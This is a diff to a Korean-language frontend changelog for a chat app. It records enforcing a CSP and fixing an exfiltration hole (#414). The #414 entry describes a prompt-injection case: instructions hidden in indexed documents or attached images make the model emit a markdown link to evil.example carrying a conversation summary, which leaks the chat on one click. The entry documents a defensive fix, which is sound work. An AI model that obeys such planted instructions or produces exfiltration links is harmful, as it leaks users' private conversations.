@@ -16,6 +16,10 @@
   - `frontend.md` 「스트리밍 UI 규칙」에 객체 동일성 계약 추가
   - 테스트 : `MessageListRender` · `ChatPageRender` 각 1건(변경 전 실패 확인). **프론트 하한 191 → 193**(통합 후 193 → 195)
 ### Security
+- **CSP 를 Report-Only 에서 강제로 바꾼다(#411).** #404 에서 위반을 기록만 하던 정책을 운영 화면 전부에서 위반 0 으로 확인한 뒤
+  `Content-Security-Policy` 로 올렸다. 확인은 브라우저 `ReportingObserver`(buffered)로 했고, 허용 밖 이미지를 일부러 불러 위반이 잡히는 것도 확인했다
+  - `frontend/vercel.json` 헤더 이름만 바뀐다. 정책 내용은 #404 그대로
+  - `frontend.md` 「배포 (Vercel)」 헤더 표
 - **답변 속 마크다운 링크를 누를 수 없는 글자로 낮춘다(#414).** 이미지(#359)는 막았지만 `a` 는 그대로 눌렸다 - 색인 문서나 첨부 이미지에
   프롬프트 주입을 심어 모델이 `[자세히](https://evil.example/?q=<대화 요약>)` 를 내게 하면 한 번 클릭으로 대화 내용이 바깥으로 나갔다(10-22 전체 QA)
   - `Markdown.tsx` 의 `a` 렌더러 : `<a>` 없이 글자 + ` (호스트)` (`new URL` 의 host, http/https 만). 상대 경로 · `javascript:` · 깨진 값은 글자만
